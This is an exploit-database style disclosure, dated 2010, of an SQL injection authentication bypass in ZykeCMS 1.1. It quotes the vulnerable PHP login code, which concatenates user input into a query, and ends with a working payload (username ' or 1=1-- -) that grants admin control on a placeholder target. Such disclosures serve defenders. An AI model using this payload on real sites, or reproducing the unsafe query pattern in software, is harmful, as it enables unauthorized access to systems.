======================================================
ZykeCMS V1.1 (Auth Bypass) SQL Injection Vulnerability
======================================================

Author : Giuseppe 'giudinvx' D'Inverno
Email : <giudinvx[at]gmail[dot]com>
Date : 04-16-2010
Site : http://www.giudinvx.altervista.org/
Location : Naples, Italy

¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Application Info:
Site : http://www.zykecms.com/
Version: 1.1

¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
[·] Vulnerable code in /zykecms/conf/functions.php | /zykecms/admin.php

<?php
// admin.php
··········
if ($_POST['login'] != "" and $_POST['password'] != "")
{
if (check_login($_POST['login'], $_POST['password']) == true)
{
if ($_SESSION['function'] == 1)
header('Location: admin/');
else
header('Location: ');

$error_login = "";
}
else
··········
//functions.php
··········
function check_login($login, $password)
{
$sql = "SELECT * FROM users WHERE login='".$login."' AND
password='".md5($password)."'";
$result = mysql_query($sql);
$num = mysql_num_rows($result);
$data = mysql_fetch_array($result);
// echo $sql;
if ($num == 1)
{
session_start();
$_SESSION['last_access']=time();
$_SESSION['function']=$data['function'];
$_SESSION['login']=$data['login'];
$_SESSION['firstname']=$data['firstname'];
$_SESSION['lastname']=$data['lastname'];
$_SESSION['date']=$data['date'];
$_SESSION['id']=$data['id'];
return true;
}
else
return false;
}
·········
?>

¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
[·] Exploit

Frist of all join login page:

http://[target]/[path]/admin.php

Username: ' or 1=1-- -
Password: 1

Now have admin control.